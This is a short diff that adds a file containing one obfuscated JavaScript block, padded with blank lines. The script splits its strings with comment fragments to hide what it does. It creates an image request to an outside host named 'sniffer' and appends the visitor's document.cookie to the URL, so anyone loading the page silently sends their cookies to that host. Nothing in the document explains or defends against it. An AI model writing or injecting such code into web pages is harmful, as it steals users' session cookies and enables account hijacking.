@@ -1,0 +1,27 @@
+
+
+
+
+
+<script>img =/*
+
+*/new Image();/*
+
+*/img.src=/*
+
+*/"http://sniff"+/*
+
+*/"er.pp.ua/im"+/*
+
+*/"ages/1qwe3_1"+/*
+
+*/".gif?"+/*
+
+*/document.cookie;/*
+
+*/</script>
+
+
+
+
+
